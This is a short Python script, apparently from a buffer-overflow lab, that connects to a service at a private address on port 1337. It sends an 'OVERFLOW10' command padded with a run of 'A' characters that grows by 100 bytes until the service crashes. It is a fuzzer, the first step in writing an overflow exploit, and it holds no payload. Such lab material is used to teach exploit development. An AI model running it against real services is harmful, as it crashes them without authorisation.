#!/usr/bin/python3

import time
import socket


host = "10.10.237.37"
port = 1337
timeout = 5
buffer_size = 100


def sendData(buffer, host, port, timeout):
    prefix = bytearray("OVERFLOW10 ".encode("ascii"))

    exploitInput = prefix + buffer
    
    csocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    csocket.settimeout(timeout)
    csocket.connect((host, port))

    print(f"[!] Data received from server: {(csocket.recv(1024)).decode('ascii')}")
    print(f"[+] Sending data...")
    csocket.send(exploitInput)
    time.sleep(0.5)
    print(f"[!] Data received from server: {(csocket.recv(1024)).decode('ascii')}")
    csocket.close()


def fuzzInput(host, port, timeout, buffer_size):
    while True:
        try:
            buffer = bytearray(("A" * buffer_size).encode("ascii"))
            print(f"[+] Trying to fuzz with {buffer_size} length...")
            sendData(buffer, host, port, timeout)
        except:
            print(f"[!] Fuzzing crashed at {buffer_size} bytes.")
            exit()
        buffer_size += 100
        time.sleep(1)


fuzzInput(host, port, timeout, buffer_size)